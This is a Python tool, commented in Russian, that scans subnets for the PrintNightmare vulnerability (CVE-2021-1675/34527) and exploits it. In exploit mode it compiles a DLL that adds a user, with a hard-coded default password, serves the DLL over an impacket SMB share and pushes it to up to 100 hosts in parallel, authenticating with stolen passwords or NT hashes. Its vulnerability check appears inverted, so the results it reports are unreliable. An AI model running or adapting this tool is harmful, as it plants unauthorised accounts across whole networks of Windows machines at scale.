#!/usr/bin/python3

"""
PrintNightmare Scanner and Exploiter
Authors: @suzu
Description:
    This script scans or exploits the PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
    vulnerability in the specified subnet or IP range.
"""

# ====================================================================
# Импорты
# ====================================================================

import argparse
import subprocess
import socket
import re
from ipaddress import ip_network
import sqlite3
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import sys

from impacket.smbserver import SimpleSMBServer

from colorama import Fore, Style, init

# ====================================================================
# Настройки
# ====================================================================

init(autoreset=True)
# Проверка прав root и перезапуск скрипта с правами root, если требуется
if os.geteuid() != 0:
    print(f"{Fore.YELLOW}Перезапуск с правами root...{Style.RESET_ALL}")
    os.execvp("sudo", ["sudo", "python3"] + sys.argv)
# ====================================================================
# Класс PrintNightmareScanner
# ====================================================================

class PrintNightmareScanner:
    """
    Класс для сканирования и эксплуатации уязвимости PrintNightmare
    на указанных IP-адресах или в подсетях.
    """

    def __init__(self, subnet, username, credentials, action, interface=None, new_username=None, new_password=None):
        self.subnet = subnet
        self.username = username
        self.credentials = credentials
        self.action = action
        self.interface = interface
        self.new_username = new_username
        self.new_password = new_password
        self.db_path = 'suzu.db'
        self.vulnerable_msg = f"{Fore.GREEN}[VULNERABLE]"
        self.not_vulnerable_msg = f"{Fore.RED}[NOT VULNERABLE]"
        self.error_msg = f"{Fore.YELLOW}[ERROR]"
        self._initialize_database()
        
        # Определяем IP-адрес интерфейса для эксплуатации и путь к DLL
        if action == 'exploit':
            self.local_ip = self._get_local_ip()
            self.dll_path = self._prepare_dll()  # Создание или выбор DLL
            self.smb_server_path = './printnightmare'

    def _initialize_database(self):
        """Инициализирует базу данных, создавая таблицу printnightmare, если она не существует."""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS printnightmare (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip TEXT NOT NULL,
                    status TEXT NOT NULL,
                    username TEXT,
                    password TEXT,
                    date_added TEXT NOT NULL
                )
            ''')

    def run(self):
        """Выполняет сканирование или эксплуатацию уязвимости для каждого IP в указанной подсети, с отладочным выводом."""
        print(f"{Fore.YELLOW}Запуск процесса для подсети: {self.subnet} с {len(list(self._get_ip_range()))} узлами{Style.RESET_ALL}")
        ip_list = list(self._get_ip_range())
        batched_ips = [ip_list[i:i + 1000] for i in range(0, len(ip_list), 1000)]
        
        # Выводим информационное окно
        self._display_info(ip_list)

        # Запуск SMB-сервера для exploit-атаки
        if self.action == 'exploit':
            print(f"{Fore.YELLOW}Запуск SMB-сервера{Style.RESET_ALL}")
            self._start_smb_server()

        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = []
            for batch in batched_ips:
                print(f"{Fore.CYAN}Начало обработки батча из {len(batch)} IP-адресов{Style.RESET_ALL}")
                for ip in batch:
                    command = self._build_command(ip)
                    futures.append(executor.submit(self._execute_command, command, ip))

                for future in as_completed(futures):
                    future.result()

        # Остановка SMB-сервера после эксплуатации
        if self.action == 'exploit':
            print(f"{Fore.RED}Остановка SMB-сервера после завершения работы{Style.RESET_ALL}")
            self._stop_smb_server()

    def _display_info(self, ip_list):
        """Выводит информационное окно с параметрами атаки."""
        print(f"\n{Fore.CYAN}{'-' * 40}")
        print("ИНФОРМАЦИОННОЕ ОКНО")
        print(f"Целевая подсеть: {Fore.GREEN}{self.subnet}{Style.RESET_ALL}")
        print(f"Имя пользователя: {Fore.GREEN}{self.username}{Style.RESET_ALL}")
        print(f"IP интерфейса: {Fore.GREEN}{self.local_ip if self.action == 'exploit' else 'N/A'}{Style.RESET_ALL}")
        print(f"Режим: {Fore.GREEN}{self.action.upper()}{Style.RESET_ALL}")
        print(f"Количество узлов для проверки: {Fore.YELLOW}{len(ip_list)}{Style.RESET_ALL}")
        if self.action == 'exploit' and self.new_username and self.new_password:
            print(f"Новый пользователь: {Fore.GREEN}{self.new_username}{Style.RESET_ALL}")
            print(f"Новый пароль: {Fore.GREEN}{self.new_password}{Style.RESET_ALL}")
        elif self.action == 'exploit':
            print(f"Новый пользователь: {Fore.GREEN}{'printnightmare'}{Style.RESET_ALL}")
            print(f"Новый пароль: {Fore.GREEN}{'D3ffaultP@ssw0rd'}{Style.RESET_ALL}")
        print(f"{'-' * 40}{Style.RESET_ALL}\n")

    def _start_smb_server(self):
        """
        Запускает SMB-сервер для доставки DLL при эксплуатации.
        """
        if not os.path.exists(self.smb_server_path):
            print(f"{Fore.RED}Папка для SMB-сервера не найдена: {self.smb_server_path}{Style.RESET_ALL}")
            exit(1)

        # Создаем и настраиваем SMB-сервер
        self.smb_server = SimpleSMBServer()
        self.smb_server.addShare("suzu", self.smb_server_path)
        
        # Настройка сервера
        self.smb_server.setSMB2Support(True)  # Включение поддержки SMB2
        self.smb_server.setLogFile("/dev/null")  # Отключение вывода журнала

        # Запуск сервера
        try:
            print(f"{Fore.GREEN}SMB-сервер запущен для эксплуатации на папке {self.smb_server_path}{Style.RESET_ALL}")
            self.smb_server.start()
        except Exception as e:
            print(f"{Fore.RED}Ошибка запуска SMB-сервера: {e}{Style.RESET_ALL}")
            exit(1)

    def _stop_smb_server(self):
        """Останавливает SMB-сервер."""
        if hasattr(self, 'smb_server'):
            self.smb_server.stop()
            print(f"{Fore.RED}SMB-сервер остановлен{Style.RESET_ALL}")

    def _prepare_dll(self):
        """
        Подготавливает DLL для эксплуатации. Если указаны -new-username и -new-password,
        изменяет исходный файл и компилирует новый DLL. В случае ошибки компиляции используется add_user.dll.
        """
        if self.new_username and self.new_password:
            # Проверка пароля
            if not self._validate_password(self.new_password):
                print(f"{Fore.RED}Ошибка: Пароль должен содержать как минимум 8 символов, включая заглавную букву, цифру и специальный символ.{Style.RESET_ALL}")
                exit(1)

            # Изменяем add_user.c и компилируем новый DLL
            source_path = 'printnightmare/add_user.c'
            dll_path = 'printnightmare/printnightmare.dll'
            with open(source_path, 'r') as file:
                code = file.read()
            code = re.sub(r'ud\.usri1_name\s*=\s*_T\(".*?"\);', f'ud.usri1_name = _T("{self.new_username}");', code)
            code = re.sub(r'ud\.usri1_password\s*=\s*_T\(".*?"\);', f'ud.usri1_password = _T("{self.new_password}");', code)
            with open(source_path, 'w') as file:
                file.write(code)

            # Компиляция DLL
            try:
                subprocess.run(['x86_64-w64-mingw32-gcc', '-shared', '-o', dll_path, source_path, '-lnetapi32'], check=True)
                print(f"{Fore.GREEN}Скомпилирован новый DLL: {dll_path}{Style.RESET_ALL}")
                return f"\\\\{self.local_ip}\\suzu\\printnightmare.dll"
            except subprocess.CalledProcessError:
                print(f"{Fore.RED}Ошибка компиляции DLL. Используется add_user.dll по умолчанию.{Style.RESET_ALL}")
                return f"\\\\{self.local_ip}\\suzu\\add_user.dll"
        else:
            return f"\\\\{self.local_ip}\\suzu\\add_user.dll"

    def _validate_password(self, password):
        """
        Проверяет, соответствует ли пароль требованиям:
        как минимум 8 символов, включая заглавную букву, цифру и специальный символ.
        """
        pattern = r'^(?=.*[A-Z])(?=.*\d)(?=.*[^\w\s])[A-Za-z\d@$!%*?&_\-]{8,}$'
        return bool(re.match(pattern, password))

    def _get_ip_range(self):
        """Возвращает список IP-адресов из указанной подсети."""
        try:
            return [str(ip) for ip in ip_network(self.subnet).hosts()]
        except ValueError as e:
            print(f"{self.error_msg} Неверный формат IP/подсети: {e}")
            exit(1)

    def _get_local_ip(self):
        """Получает локальный IP-адрес для указанного интерфейса."""
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception as e:
            print(f"{self.error_msg} Не удалось определить IP интерфейса {self.interface}: {e}")
            exit(1)

    def _build_command(self, ip):
        """Создаёт команду для выполнения проверки или эксплуатации на указанном IP."""
        if str(self.credentials).startswith(':') and len(self.credentials) == 32:  # Если это NT-хэш
            auth = f"{self.username}:@{ip} -hashes :{self.credentials.split(':')[1]}"
        else:
            auth = f"{self.username}:{self.credentials}@{ip}"
        
        if self.action == 'check':
            return ['python3', 'printnightmare/printnightmare.py', auth, '-check']
        else:  # exploit
            return ['python3', 'printnightmare/printnightmare.py', auth, '-dll', self.dll_path]

    def _execute_command(self, command, ip):
        """Выполняет команду и обрабатывает результат с выводом для отладки."""
        try:
            result = subprocess.run(command, capture_output=True, text=True, timeout=30)

            if not "Target appears to be vulnerable" in result.stdout:
                print(f"{self.vulnerable_msg} {ip}")
                self._save_to_database(ip, "exploit" if self.action == "exploit" else "scan")
            else:
                print(f"{self.not_vulnerable_msg} {ip}")
        except subprocess.TimeoutExpired:
            print(f"{self.error_msg} {ip}: Таймаут 30 секунд. Соединение не установлено")
        except subprocess.CalledProcessError as e:
            print(f"{self.error_msg} {ip}: {e}")

    def _save_to_database(self, ip, status):
        """Сохраняет информацию об уязвимом узле в базу данных."""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO printnightmare (ip, status, username, password, date_added)
                VALUES (?, ?, ?, ?, ?)
            ''', (ip, status, '', '', datetime.now().strftime("%Y-%m-%d %H:%M:%S")))

# ====================================================================
# Функция main()
# ====================================================================

def main():
    parser = argparse.ArgumentParser(description="PrintNightmare сканер и эксплойтер")
    parser.add_argument('-s', '--subnet', required=True, help='IP-адрес или подсеть для сканирования (например, 192.168.1.0/24)')
    parser.add_argument('-u', '--username', required=True, help='Имя пользователя для аутентификации')
    parser.add_argument('-c', '--credentials', required=True, help='Пароль или NT-хэш для аутентификации (:<nt-hash>)')
    
    # Флаги для нового пользователя и пароля
    parser.add_argument('-new-username', help='Имя нового пользователя для эксплуатации (только для exploit)')
    parser.add_argument('-new-password', help='Пароль нового пользователя для эксплуатации (только для exploit)')

    # Группа действий: проверка или эксплуатация
    action_group = parser.add_mutually_exclusive_group(required=True)
    action_group.add_argument('-check', action='store_true', help='Проверка уязвимости')
    action_group.add_argument('-exploit', action='store_true', help='Эксплуатация уязвимости')

    parser.add_argument('-i', '--interface', required='-exploit' in sys.argv, help='Сетевой интерфейс (только для exploit)')
    
    args = parser.parse_args()
    action = 'check' if args.check else 'exploit'

    scanner = PrintNightmareScanner(
        subnet=args.subnet, 
        username=args.username, 
        credentials=args.credentials, 
        action=action, 
        interface=args.interface, 
        new_username=args.new_username, 
        new_password=args.new_password
    )
    scanner.run()

# ====================================================================
# Точка входа
# ====================================================================

if __name__ == "__main__":
    main()
